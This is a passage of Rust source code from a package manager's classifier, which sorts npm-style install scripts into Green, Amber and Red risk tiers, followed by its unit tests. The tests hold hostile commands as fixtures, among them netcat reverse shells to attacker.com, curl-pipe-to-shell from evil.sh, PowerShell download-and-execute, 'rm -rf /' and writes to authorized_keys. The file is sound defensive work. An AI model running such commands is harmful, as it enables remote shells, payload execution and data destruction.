/// wrapper) branch on this, while consumers that only care about the
/// in-package path drop it via [`extract_delegate_path`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DelegateShape {
    /// `node <path>` — two POSIX-shell tokens. Recognised by
    /// [`matches_node_relative`] (non-reserved basename → Green
    /// unconditionally) and by [`matches_delegating_identity_green`]
    /// (reserved basename + identity match → Green).
    Bare,
    /// `node -e <body>` / `node --eval <body>` — three tokens where
    /// `<body>` matches one of the [`parse_softfail_wrapper`] shapes.
    /// Recognised by [`matches_node_eval_softfail_green`]
    /// (non-reserved basename → Green; reserved basename → Amber).
    SoftfailWrapper,
}

/// A delegate-shape match: the in-package relative path the script
/// delegates to, plus the shape the recogniser identified.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DelegateMatch {
    pub path: String,
    pub shape: DelegateShape,
}

/// Recognise any script body shape this module classifies as a
/// delegate-to-local-file and return both the in-package path and
/// the shape that matched. `None` for anything else.
///
/// This is the **single source of truth** for delegate recognition.
/// Every classifier branch that grants Green via a delegate shape
/// ([`matches_node_relative`], [`matches_delegating_identity_green`],
/// [`matches_node_eval_softfail_green`]) dispatches through this
/// function, then applies its specific tier rules to the returned
/// shape and path. The script-hash binding
/// (`lpm_security::script_hash::compute_script_hash`) and the
/// advisor embed-view (`lpm_cli::build_state::parse_delegated_paths`)
/// also read through this function. Drift between the classifier
/// and the recogniser is structurally impossible because there's
/// only one recogniser.
///
/// Recognition rules (apply to both shapes):
///
/// - Path must be safe-relative (no absolute, no `..`, no `~`/`$`).
/// - Path must end in `.js` / `.cjs` / `.mjs`. Extensionless require
///   resolution (`./X` resolving to `X.js` / `X.json` / `X/index.js`)
///   is ambiguous; the hash cannot deterministically pick a file to
///   bind, so the classifier leaves these out of Green too.
///
/// Adding a new delegate shape is a one-line change here (new arm in
/// the token-pattern match below). The classifier's per-shape tier
/// rules pick the new shape up automatically; the script-hash binding
/// picks it up via [`extract_delegate_path`]. The coverage test
/// (`compute_script_hash_binds_delegate_for_every_greenlit_node_path_spelling`)
/// must also gain the new spelling so the binding is exercised
/// against benign-vs-malicious file pairs end-to-end.
pub fn extract_delegate_match(body: &str) -> Option<DelegateMatch> {
    let tokens = shlex::split(body)?;
    let (path, shape) = match tokens.as_slice() {
        // Bare delegate: `node <path>`
        [n, p] if n == "node" => (p.clone(), DelegateShape::Bare),
        // Softfail wrapper: `node -e <body>` or `node --eval <body>`
        [n, e, wrapper] if n == "node" && (e == "-e" || e == "--eval") => (
            parse_softfail_wrapper(wrapper)?,
            DelegateShape::SoftfailWrapper,
        ),
        _ => return None,
    };
    if !is_safe_relative_path(&path) {
        return None;
    }
    if !(path.ends_with(".js") || path.ends_with(".cjs") || path.ends_with(".mjs")) {
        return None;
    }
    Some(DelegateMatch { path, shape })
}

/// Thin wrapper over [`extract_delegate_match`] that drops the shape
/// info. Used by call sites that only need the in-package path
/// (script-hash binding, advisor embed-view).
pub fn extract_delegate_path(body: &str) -> Option<String> {
    extract_delegate_match(body).map(|m| m.path)
}

// ─────────────────────────────────────────────────────────────────────
// Delegate-to-local-file with matching identity
// ─────────────────────────────────────────────────────────────────────

/// Step 5b: detect `node <path>.js` where `<path>` is a reserved
/// lifecycle basename (`install.js`, `postinstall.js`, etc., plus
/// the .cjs/.mjs variants), AND the package's manifest carries an
/// identity signal that pairs with the delegate.
///
/// "Identity signal" means EITHER:
///
/// - The package's base name (last segment of a scoped name) appears
///   as a path segment of the `repository` URL — e.g. the body
///   `node install.js` from a package named `sharp` whose repo URL
///   contains `/sharp` or `/sharp.git`. This pairs the local
///   installer script with the canonical-looking source repository.
///
/// - The package exposes a `bin` entry whose name matches the
///   package's base name — e.g. `lpm-cli` exposing a `bin: { lpm:
///   "..."}`. The presence of a CLI binary named after the package
///   is a strong "this package ships a runtime artifact" signal that
///   pairs naturally with a postinstall fetcher.
///
/// Why this is safe enough for L1 Green:
///
/// - The matched shape is **only the script line** `node <reserved>.js`
///   — no compound, no flags, no extra tokens. Compound bodies stay
///   Amber via step 4; multi-token bodies stay Amber via
///   [`matches_node_relative`]'s `tokens.len() == 2` guard.
/// - The delegated file's actual bytes live in the package store and
///   can still be reviewed by `lpm approve-scripts`. The Green
///   widening just changes the default from "always prompt" to
///   "auto-run when shape + identity agree."
/// - A malicious package CAN lie about its repository field. The
///   counter-measure is that `lpm approve-scripts` embeds the
///   delegate file's actual content in the review prompt — the lie
///   is one step removed from the payload, which the user sees
///   directly. This check alone trusts the field; the user-explicit
///   `lpm approve-scripts` review remains the safety floor.
fn matches_delegating_identity_green(body: &str, ctx: &ManifestContext<'_>) -> bool {
    let Some(m) = extract_delegate_match(body) else {
        return false;
    };
    // Only the bare-delegate shape participates in the identity-match
    // widening today. Extending the widening to the softfail-wrapper
    // shape would be a deliberate policy change — leave that to a
    // separate, explicitly-reviewed update.
    if !matches!(m.shape, DelegateShape::Bare) {
        return false;
    }
    let basename = m.path.rsplit('/').next().unwrap_or(&m.path);
    // Only fire on the reserved-basename set — install.js /
    // postinstall.js / preinstall.js + .cjs/.mjs variants. Other
    // `node <name>.js` paths take the existing
    // [`matches_node_relative`] route and are already Green when
    // not reserved.
    if !is_reserved_lifecycle_basename(basename) {
        return false;
    }

    // Cooldown defense-in-depth. Refuse to widen when the configured
    // `minimum_release_age_secs > 0` AND
    // the package's publish age is below the threshold (or unknown).
    //
    // Rationale: this identity-match widening is designed for "old,
    // established packages." A maintainer-compromise scenario
    // produces a recent publish with the SAME identity shape —
    // exactly the case the install-level cooldown gate protects
    // against. Without this check, `lpm install --allow-new`
    // (which bypasses the install-level cooldown) would silently
    // ALSO bypass the script-tier review for matching-identity
    // packages, collapsing two orthogonal security axes into one.
    // With this check, `--allow-new` users still see the
    // script-tier prompt for recent publishes; they must
    // explicitly choose `--policy=allow` to also bypass that.
    //
    // When `min_release_age_secs == 0` the user has globally opted
    // out of cooldown protection (persistent config or
    // `--min-release-age=0`); we honor that choice and widen
    // regardless of publish age.
    if ctx.min_release_age_secs > 0 {
        match ctx.publish_age_secs {
            Some(age) if age >= ctx.min_release_age_secs => {
                // Old enough — fall through to identity match.
            }
            _ => {
                // Recent publish OR unknown age — refuse to widen.
                // Conservative: an unknown age could be a recent
                // publish, so default-refuse keeps the defense
                // active even when the caller couldn't supply data.
                return false;
            }
        }
    }

    matches_manifest_identity(ctx)
}

/// Identity-match helper. Returns `true` when the package's base
/// name appears as a path segment of the repository URL or matches a
/// `bin` entry's name. Returns `false` for an empty / unparseable
/// identity (no false-Green on missing signal).
fn matches_manifest_identity(ctx: &ManifestContext<'_>) -> bool {
    let base = package_base_name(ctx.package_name);
    if base.is_empty() {
        return false;
    }
    if let Some(repo) = ctx.repository
        && repo_url_contains_identity(repo, &base)
    {
        return true;
    }
    ctx.bin_names.iter().any(|b| *b == base)
}

/// Extract the unscoped portion of a package name. `@swc/core` →
/// `core`; `sharp` → `sharp`. Returns the empty string when given
/// only a scope (e.g. `@swc`) or an empty name.
fn package_base_name(name: &str) -> String {
    if let Some(after_slash) = name.rsplit('/').next() {
        return after_slash.to_string();
    }
    name.to_string()
}

/// Check whether the repository URL contains the package's base name
/// as a path-segment-like substring. We split on `/`, `:`, `.`, and
/// `?` boundaries so URLs like `git+https://github.com/lovell/sharp.git`
/// or `github:lovell/sharp` both surface the `sharp` segment.
///
/// Conservative on short / generic base names: anything ≤ 2 chars
/// or a single common ecosystem token (`js`, `lib`, `core`, `node`)
/// is treated as having no identity payload — these match too many
/// unrelated repository URLs to be a useful signal. A future
/// extension could keep a richer denylist or weight against URL
/// segment frequency; for now the simple form is enough to gate the
/// false-Green stress test.
fn repo_url_contains_identity(repo: &str, base: &str) -> bool {
    if base.len() < 3 {
        return false;
    }
    const GENERIC: &[&str] = &["js", "lib", "core", "node", "src", "util", "utils"];
    if GENERIC.contains(&base.to_ascii_lowercase().as_str()) {
        return false;
    }
    let needle = base.to_ascii_lowercase();
    repo.to_ascii_lowercase()
        .split(['/', ':', '.', '?', '#', '@', ' '])
        .filter(|s| !s.is_empty())
        .any(|seg| seg == needle || seg == format!("{needle}.git").as_str())
}

// ─────────────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn tier(script: &str) -> StaticTier {
        classify(script)
    }

    // ── Green allowlist ──────────────────────────────────────────────

    #[test]
    fn green_tsc_variants() {
        assert_eq!(tier("tsc"), StaticTier::Green);
        assert_eq!(tier("tsc -b"), StaticTier::Green);
        assert_eq!(tier("tsc --build"), StaticTier::Green);
        assert_eq!(tier("tsc -p ./tsconfig.json"), StaticTier::Green);
        assert_eq!(tier("tsc --project src/tsconfig.json"), StaticTier::Green);
    }

    #[test]
    fn green_node_gyp() {
        assert_eq!(tier("node-gyp rebuild"), StaticTier::Green);
        assert_eq!(tier("node-gyp rebuild --release"), StaticTier::Green);
        assert_eq!(tier("node-gyp rebuild --debug"), StaticTier::Green);
        assert_eq!(
            tier("node-gyp rebuild --release --debug"),
            StaticTier::Green
        );
    }

    #[test]
    fn green_electron_rebuild_bare_only() {
        assert_eq!(tier("electron-rebuild"), StaticTier::Green);
        // Args push to Amber — we can widen if corpus demands it.
        assert_eq!(tier("electron-rebuild -f"), StaticTier::Amber);
    }

    #[test]
    fn green_husky_both_forms() {
        assert_eq!(tier("husky"), StaticTier::Green);
        assert_eq!(tier("husky install"), StaticTier::Green);
    }

    #[test]
    fn green_prisma_generate() {
        assert_eq!(tier("prisma generate"), StaticTier::Green);
    }

    #[test]
    fn green_node_relative_paths() {
        assert_eq!(tier("node build.js"), StaticTier::Green);
        assert_eq!(tier("node ./scripts/build.js"), StaticTier::Green);
        assert_eq!(tier("node lib/helper.mjs"), StaticTier::Green);
        assert_eq!(tier("node ./tools/gen.cjs"), StaticTier::Green);
    }

    #[test]
    fn amber_node_install_js_exception_wins() {
        // The plan-doc update locks this: install.js / postinstall.js
        // are the binary-fetcher convention and must NOT be green.
        assert_eq!(tier("node install.js"), StaticTier::Amber);
        assert_eq!(tier("node postinstall.js"), StaticTier::Amber);
        assert_eq!(tier("node ./install.js"), StaticTier::Amber);
        assert_eq!(tier("node scripts/install.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_reserved_basenames_p05_widened() {
        // Extended to cover .cjs/.mjs and preinstall variants:
        // {install,postinstall,preinstall}.{js,cjs,mjs} all reserved.
        // Audit-found packages slipping through the .js-only check:
        // - puppeteer (rank 2857, 40.8M dl/mo): postinstall=`node install.mjs`
        // - @anthropic-ai/claude-code (rank 2720): postinstall=`node install.cjs`
        // - dd-trace (rank 3391): preinstall=`node scripts/preinstall.js`
        for path in [
            "install.cjs",
            "install.mjs",
            "postinstall.cjs",
            "postinstall.mjs",
            "preinstall.js",
            "preinstall.cjs",
            "preinstall.mjs",
            "./install.mjs",
            "./install.cjs",
            "scripts/preinstall.js",
            "./scripts/preinstall.cjs",
        ] {
            let s = format!("node {path}");
            assert_eq!(
                tier(&s),
                StaticTier::Amber,
                "reserved basename must stay amber: {s}"
            );
        }
    }

    #[test]
    fn amber_node_escaping_path() {
        assert_eq!(tier("node ../other/build.js"), StaticTier::Amber);
        assert_eq!(tier("node /abs/path.js"), StaticTier::Amber);
        assert_eq!(tier("node ~/build.js"), StaticTier::Amber);
        assert_eq!(tier("node $HOME/build.js"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_without_js_extension() {
        assert_eq!(tier("node build"), StaticTier::Amber);
        assert_eq!(tier("node ./script"), StaticTier::Amber);
    }

    #[test]
    fn amber_node_with_extra_args() {
        // More-than-two-token forms are not green (conservative).
        assert_eq!(tier("node build.js --port 3000"), StaticTier::Amber);
    }

    // ── Soft-fail postinstall wrappers ───────────────────────────────
    //
    // The canonical safe wrapper `node -e "try{require('./X')}catch(e){}"`
    // and the `import('./X').catch(...)` variant must NOT classify red.
    // Default outcome is amber; green is reserved for the strictly
    // qualifying case (explicit `.js`/`.cjs`/`.mjs` extension AND
    // safe-relative path AND non-reserved basename).

    #[test]
    fn audit_repro_softfail_wrappers_are_not_red() {
        // Known top-5000 packages that must not classify as false-positive reds
        // (rank, monthly downloads in parens for context only).
        let cases = [
            // core-js (582, 253M/mo) and core-js-pure (2024, 70M/mo)
            r#"node -e "try{require('./postinstall')}catch(e){}""#,
            // msw (2084, 68M/mo) — import variant with `() => void 0`
            r#"node -e "import('./config/scripts/postinstall.js').catch(() => void 0)""#,
            // nx (3006, 37M/mo)
            r#"node -e "try{require('./dist/bin/post-install')}catch(e){}""#,
            // vue-demi (3678, 26M/mo)
            r#"node -e "try{require('./scripts/postinstall.js')}catch(e){}""#,
        ];
        for s in cases {
            assert_ne!(
                tier(s),
                StaticTier::Red,
                "softfail wrapper must not classify red: {s}"
            );
        }
    }

    #[test]
    fn softfail_wrapper_extensionless_is_amber() {
        // No explicit .js extension → stays amber (default-amber rule).
        // Covers the four audit reds with extensionless require targets:
        // core-js / core-js-pure / es5-ext / nx.
        assert_eq!(
            tier(r#"node -e "try{require('./postinstall')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./_postinstall')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./dist/bin/post-install')}catch(e){}""#),
            StaticTier::Amber
        );
    }

    #[test]
    fn softfail_wrapper_reserved_basename_is_amber() {
        // Explicit .js extension but basename matches the binary-fetcher
        // reserved names → amber (the basename rule wins, per the
        // existing amber convention). Covers msw and vue-demi.
        assert_eq!(
            tier(r#"node -e "import('./config/scripts/postinstall.js').catch(() => void 0)""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/postinstall.js')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('install.js')}catch(e){}""#),
            StaticTier::Amber
        );
    }

    #[test]
    fn softfail_wrapper_reserved_basename_p05_widened() {
        // The shared `is_reserved_lifecycle_basename` helper covers
        // .cjs / .mjs and `preinstall` for the softfail-wrapper green
        // path too — otherwise packages could slip through one route
        // but not the other.
        assert_eq!(
            tier(r#"node -e "try{require('./install.cjs')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./install.mjs')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "import('./install.mjs').catch(() => void 0)""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "import('./postinstall.cjs').catch(() => void 0)""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/preinstall.js')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/preinstall.cjs')}catch(e){}""#),
            StaticTier::Amber
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/preinstall.mjs').catch(() => void 0)""#),
            StaticTier::Amber
        );
    }

    #[test]
    fn softfail_wrapper_with_compound_falls_through_to_amber() {
        // es5-ext (rank 2407, 53M/mo) ships
        // `node -e "..." || exit 0`. The softfail recognition prevents
        // the red, then the compound operator pushes the script to
        // amber via the standard fallback.
        let s = r#"node -e "try{require('./_postinstall')}catch(e){}" || exit 0"#;
        assert_eq!(tier(s), StaticTier::Amber);
    }

    #[test]
    fn softfail_wrapper_safe_path_with_explicit_ext_is_green() {
        // Safe-relative path, explicit .js/.cjs/.mjs extension,
        // non-reserved basename → green.
        assert_eq!(
            tier(r#"node -e "try{require('./scripts/setup.js')}catch(e){}""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "try{require('./lib/bootstrap.cjs')}catch(e){}""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/setup.mjs').catch(() => void 0)""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./lib/init.js').catch(() => undefined)""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/x.js').catch(() => null)""#),
            StaticTier::Green
        );
        assert_eq!(
            tier(r#"node -e "import('./scripts/x.js').catch(() => {})""#),
            StaticTier::Green
        );
    }

    #[test]
    fn softfail_wrapper_escaping_path_stays_red() {
        // Path escapes the package dir — the wrapper-recognition step
        // still parses the shape, but `is_safe_relative_path` rejects
        // it for green AND the body is a no-op so the result is amber
        // (NOT red — this is the conservative default; if maintainers
        // want red for "..", that's a follow-up).
        let s = r#"node -e "try{require('../../etc/passwd')}catch(e){}""#;
        assert_eq!(tier(s), StaticTier::Amber);
        // Absolute path also amber, not red.
        let s2 = r#"node -e "try{require('/etc/passwd')}catch(e){}""#;
        assert_eq!(tier(s2), StaticTier::Amber);
    }

    #[test]
    fn softfail_wrapper_nontrivial_catch_body_is_red() {
        // Catch body is not empty `{}`. The shape does NOT match the
        // accepted softfail regex, so the eval'd body falls through
        // the normal `node -e` red path.
        let s = r#"node -e "try{require('./x')}catch(e){doEvil()}""#;
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn softfail_wrapper_import_non_trivial_handler_is_red() {
        // `.catch(e => eval(e.message))` is not a trivial handler.
        let s = r#"node -e "import('./x.js').catch(e => eval(e.message))""#;
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn softfail_wrapper_non_relative_require_is_red() {
        // `require('fs')` — not a relative path. The path-capture
        // regex still matches (`fs` is just a string), but downstream
        // the green path needs explicit `.js` extension which `fs`
        // lacks, AND `is_safe_relative_path("fs")` is true (no
        // unsafe prefix) — so the wrapper itself is recognized and
        // falls to amber. We do NOT red on `require('fs')` here
        // because the catch swallows any side effect; if maintainers
        // want stricter behavior, tighten in a follow-up.
        let s = r#"node -e "try{require('fs')}catch(e){}""#;
        assert_eq!(tier(s), StaticTier::Amber);
    }

    // ── Green: node-gyp-build family ─────────────────────────────────

    #[test]
    fn green_node_gyp_build_bare() {
        assert_eq!(tier("node-gyp-build"), StaticTier::Green);
        assert_eq!(tier("node-gyp-build-optional-packages"), StaticTier::Green);
    }

    // ── Green: no-op shapes ───────────────────────────────────────────

    #[test]
    fn green_exit_noop_variants() {
        // Bare `exit` and `exit 0` — script-body no-ops. The
        // @datadog/native-* family ships `exit 0` as a placeholder
        // preinstall.
        assert_eq!(tier("exit"), StaticTier::Green);
        assert_eq!(tier("exit 0"), StaticTier::Green);
    }

    #[test]
    fn amber_exit_nonzero_or_with_extras() {
        // Non-zero exit codes are unusual in a preinstall and the
        // green rule deliberately doesn't widen here.
        assert_eq!(tier("exit 1"), StaticTier::Amber);
        assert_eq!(tier("exit 2"), StaticTier::Amber);
        // Extra arg → amber.
        assert_eq!(tier("exit 0 silently"), StaticTier::Amber);
    }

    #[test]
    fn green_colon_noop() {
        // POSIX `:` builtin — strictly a no-op.
        assert_eq!(tier(":"), StaticTier::Green);
    }

    #[test]
    fn green_echo_noop_variants() {
        // Bare `echo` writes a newline; `echo <static-literal>` is the
        // @google/genai shape. Both are no-ops at the security-relevant
        // level.
        assert_eq!(tier("echo"), StaticTier::Green);
        assert_eq!(tier("echo hello"), StaticTier::Green);
        // The audit-found case: shlex strips the single quotes, leaving
        // one token `preinstall: no-op` — passes the literal guard.
        assert_eq!(tier("echo 'preinstall: no-op'"), StaticTier::Green);
        // Empty-string literal is also a static literal.
        assert_eq!(tier("echo \"\""), StaticTier::Green);
    }

    #[test]
    fn amber_echo_with_variable_or_command_substitution() {
        // `$VAR` / `$()` / `\`...\`` / backslash sequences could
        // expand to shell commands at runtime — keep amber.
        assert_eq!(tier("echo $HOME"), StaticTier::Amber);
        assert_eq!(tier("echo \"$HOME\""), StaticTier::Amber);
        assert_eq!(tier("echo $(whoami)"), StaticTier::Amber);
        assert_eq!(tier("echo `whoami`"), StaticTier::Amber);
        // Backslash escapes.
        assert_eq!(tier("echo a\\nb"), StaticTier::Amber);
    }

    #[test]
    fn amber_echo_with_flags() {
        // `-e` enables backslash interpretation; `-n` suppresses
        // newline. Both are flags, not safe static literals.
        assert_eq!(tier("echo -e hi"), StaticTier::Amber);
        assert_eq!(tier("echo -n hi"), StaticTier::Amber);
        assert_eq!(tier("echo --help"), StaticTier::Amber);
    }

    #[test]
    fn amber_echo_with_multiple_args() {
        // Strict single-arg rule: even fully-literal multiple args
        // stay amber so the green path can't drift into "echo $A $B"
        // territory through future broadening.
        assert_eq!(tier("echo a b"), StaticTier::Amber);
        assert_eq!(tier("echo hello world"), StaticTier::Amber);
    }

    // ── Green: node-gyp-build family (P1 — kept here for context) ────

    #[test]
    fn amber_node_gyp_build_with_args() {
        // node-gyp-build's bin.js passes `process.argv[2]` to a child
        // shell, so the bare form is the only safe-by-construction
        // shape. With ANY extra argument, defer to amber.
        assert_eq!(tier("node-gyp-build --some-flag"), StaticTier::Amber);
        assert_eq!(tier("node-gyp-build some-command"), StaticTier::Amber);
        assert_eq!(
            tier("node-gyp-build-optional-packages --foo"),
            StaticTier::Amber
        );
    }

    // ── Red: prefilter (Unicode + PowerShell literals) ──────────────

    #[test]
    fn red_unicode_rtl_override() {
        // U+202E RIGHT-TO-LEVEL OVERRIDE — the "Trojan Source" signature.
        let s = "echo hi\u{202E}rm -rf /";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_unicode_zero_width_joiner() {
        let s = "tsc\u{200D}";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_unicode_bom_in_body() {
        let s = "tsc\u{FEFF}";
        assert_eq!(tier(s), StaticTier::Red);
    }

    #[test]
    fn red_powershell_invoke_expression() {
        let s = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')";
        assert_eq!(tier(s), StaticTier::Red);
        // Case-insensitive match.
        assert_eq!(tier("invoke-expression $something"), StaticTier::Red);
    }

    #[test]
    fn red_powershell_from_base64_string() {
        assert_eq!(
            tier("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('x'))"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_powershell_add_mppreference() {
        assert_eq!(
            tier("Add-MpPreference -ExclusionPath C:\\Users\\evil"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_iex_as_bare_token() {
        assert_eq!(tier("iex $payload"), StaticTier::Red);
    }

    #[test]
    fn red_iex_substring_does_not_false_positive() {
        // These should NOT be red — the word contains "iex" as a
        // substring of a longer English token.
        assert_eq!(tier("complex"), StaticTier::Amber);
        assert_eq!(tier("regex"), StaticTier::Amber);
    }

    // ── Red: tokenized dangerous commands ───────────────────────────

    #[test]
    fn red_eval_bare() {
        assert_eq!(tier("eval $MALICIOUS"), StaticTier::Red);
    }

    #[test]
    fn red_node_dash_e() {
        assert_eq!(
            tier("node -e 'require(\"fs\").unlink(\"/etc/passwd\")'"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_node_long_eval() {
        assert_eq!(tier("node --eval 'console.log(1)'"), StaticTier::Red);
    }

    #[test]
    fn red_node_eval_glued_flag_forms() {
        assert_eq!(tier("node --eval=console.log(1)"), StaticTier::Red);
        assert_eq!(tier("node -e=console.log(1)"), StaticTier::Red);
        assert_eq!(tier("node -econsole.log(1)"), StaticTier::Red);
    }

    #[test]
    fn red_node_eval_with_preceding_flags() {
        // `node --no-warnings -e '...'` should still trip.
        assert_eq!(
            tier("node --no-warnings -e 'console.log(1)'"),
            StaticTier::Red
        );
    }

    #[test]
    fn red_nc_netcat() {
        assert_eq!(tier("nc -l 8080"), StaticTier::Red);
        assert_eq!(tier("netcat attacker.com 4444"), StaticTier::Red);
        assert_eq!(tier("ncat -e /bin/sh attacker.com 4444"), StaticTier::Red);
    }

    // ── Red: pipe-to-shell (must win over compound) ─────────────────

    #[test]
    fn red_curl_pipe_sh() {
        assert_eq!(tier("curl https://evil.sh | sh"), StaticTier::Red);
    }

    #[test]
    fn red_curl_pipe_bash() {
        assert_eq!(tier("curl -fsSL https://evil.sh | bash"), StaticTier::Red);
    }

    #[test]
    fn red_wget_pipe_shell() {
        assert_eq!(tier("wget -O - https://evil.sh | sh"), StaticTier::Red);
    }

    #[test]
    fn red_base64_decode_pipe_shell() {
        assert_eq!(tier("base64 -d payload | sh"), StaticTier::Red);
        assert_eq!(tier("base64 --decode blob | bash"), StaticTier::Red);
    }

    #[test]
    fn red_wins_over_compound_fallback() {
        // The archetypal case: `curl … | sh`. The `|` operator would
        // otherwise short-circuit to Amber via the compound check —
        // we explicitly test here that red runs FIRST.
        let s = "curl https://x | sh";
        assert_eq!(tier(s), StaticTier::Red, "red must win over compound");
    }

    // ── Red: no-space operator forms (regression for review-round
    //         finding: shlex leaves unspaced operators embedded in
    //         tokens, so classify MUST normalize before tokenizing) ─

    #[test]
    fn red_curl_pipe_sh_no_space() {
        assert_eq!(tier("curl https://evil.sh|sh"), StaticTier::Red);
    }

    #[test]
    fn red_base64_decode_pipe_sh_no_space() {
        assert_eq!(tier("base64 -d payload|sh"), StaticTier::Red);
    }

    #[test]
    fn red_redirect_no_space() {
        assert_eq!(tier("echo hi>~/.bashrc"), StaticTier::Red);
        assert_eq!(tier("echo hi>>~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("echo x>/etc/pam.d/sudo"), StaticTier::Red);
    }

    #[test]
    fn amber_compound_no_space() {
        // Compound operators with no surrounding whitespace must still
        // be detected as compound (not green, not a novel command).
        assert_eq!(tier("tsc&&husky install"), StaticTier::Amber);
        assert_eq!(tier("tsc;prisma generate"), StaticTier::Amber);
        assert_eq!(tier("tsc||true"), StaticTier::Amber);
    }

    // ── Normalizer: quoted operator chars must NOT be padded ────────

    #[test]
    fn normalizer_leaves_quoted_operators_alone() {
        // Quoted operator characters inside a single-arg echo are
        // content, not operators — they must NOT trip the pipe-to-
        // shell or compound-detection paths. Post-Part-A-closeout
        // these now classify green via the static-literal echo rule
        // (no `$`, no backticks, no backslashes, no flags, one arg).
        // The original intent of this test was "doesn't false-
        // positive red" — that contract still holds; the resting
        // tier is now green instead of amber.
        assert_eq!(tier("echo 'a|b|c'"), StaticTier::Green);
        assert_eq!(tier("echo \"a>b\""), StaticTier::Green);
        // Backslash escapes stay AMBER (the strict echo guard
        // rejects any `\` in the raw script — even quoted-string
        // content where shell semantics would render it literal).
        assert_eq!(tier("echo a\\|b"), StaticTier::Amber);
    }

    #[test]
    fn normalizer_preserves_quoted_pipe_payload() {
        // If a curl URL happens to contain `|` inside quotes, we
        // should NOT false-positive red — the `|` is content.
        // (Contrived; real URLs rarely contain `|`, but the quote
        // semantics must hold.)
        let s = "curl 'https://x.example/foo|bar'";
        // No `|` appears as an operator, no `sh` follows; amber.
        assert_eq!(tier(s), StaticTier::Amber);
    }

    #[test]
    fn normalizer_handles_two_char_operators() {
        // Explicit coverage: `>>` must be recognized as one operator,
        // not two `>` tokens (downstream `has_dangerous_redirect`
        // expects the `>>` token form).
        assert_eq!(tier("echo x>>~/.bashrc"), StaticTier::Red);
        // `||` and `&&` become standalone compound tokens.
        assert_eq!(tier("tsc||true"), StaticTier::Amber);
        assert_eq!(tier("tsc&&prisma generate"), StaticTier::Amber);
    }

    // ── Red: nested package managers ────────────────────────────────

    #[test]
    fn red_npm_install_nested() {
        assert_eq!(tier("npm install malware"), StaticTier::Red);
        assert_eq!(tier("npm i malware"), StaticTier::Red);
    }

    #[test]
    fn red_pnpm_yarn_bun_lpm_nested() {
        assert_eq!(tier("pnpm install x"), StaticTier::Red);
        assert_eq!(tier("yarn add x"), StaticTier::Red);
        assert_eq!(tier("bun add x"), StaticTier::Red);
        assert_eq!(tier("lpm install x"), StaticTier::Red);
    }

    #[test]
    fn red_pip_gem_cargo_brew_nested() {
        assert_eq!(tier("pip install requests"), StaticTier::Red);
        assert_eq!(tier("pip3 install requests"), StaticTier::Red);
        assert_eq!(tier("gem install rails"), StaticTier::Red);
        assert_eq!(tier("cargo install ripgrep"), StaticTier::Red);
        assert_eq!(tier("brew install thing"), StaticTier::Red);
    }

    #[test]
    fn amber_npm_run_script_not_install() {
        // `npm run build` is NOT a nested PM install; should be amber.
        assert_eq!(tier("npm run build"), StaticTier::Amber);
    }

    // ── Red: rm -rf on dangerous targets ────────────────────────────

    #[test]
    fn red_rm_rf_dangerous_targets() {
        assert_eq!(tier("rm -rf ~"), StaticTier::Red);
        assert_eq!(tier("rm -rf /"), StaticTier::Red);
        assert_eq!(tier("rm -rf $HOME"), StaticTier::Red);
        assert_eq!(tier("rm -rf ${HOME}"), StaticTier::Red);
        assert_eq!(tier("rm -rf ~/.config"), StaticTier::Red);
        assert_eq!(tier("rm -rf /etc/something"), StaticTier::Red);
    }

    #[test]
    fn red_rm_rf_flag_spellings() {
        assert_eq!(tier("rm -rf ~"), StaticTier::Red);
        assert_eq!(tier("rm -fr ~"), StaticTier::Red);
        assert_eq!(tier("rm -r -f ~"), StaticTier::Red);
        assert_eq!(tier("rm -f -r ~"), StaticTier::Red);
        assert_eq!(tier("rm --recursive --force ~"), StaticTier::Red);
    }

    #[test]
    fn amber_rm_rf_relative_target() {
        // Relative targets stay amber — we can't statically prove
        // containment but they're also not in the red class.
        assert_eq!(tier("rm -rf node_modules"), StaticTier::Amber);
        assert_eq!(tier("rm -rf dist"), StaticTier::Amber);
    }

    #[test]
    fn amber_rm_without_force_and_recursive() {
        // `rm` alone doesn't meet the `-r && -f` requirement → not red.
        assert_eq!(tier("rm foo.txt"), StaticTier::Amber);
        assert_eq!(tier("rm -r foo"), StaticTier::Amber);
        assert_eq!(tier("rm -f foo"), StaticTier::Amber);
    }

    // ── Red: chmod outside package/node_modules ─────────────────────

    #[test]
    fn red_chmod_outside_package() {
        assert_eq!(tier("chmod +x ~/.ssh/authorized_keys"), StaticTier::Red);
        assert_eq!(tier("chmod 777 /etc/passwd"), StaticTier::Red);
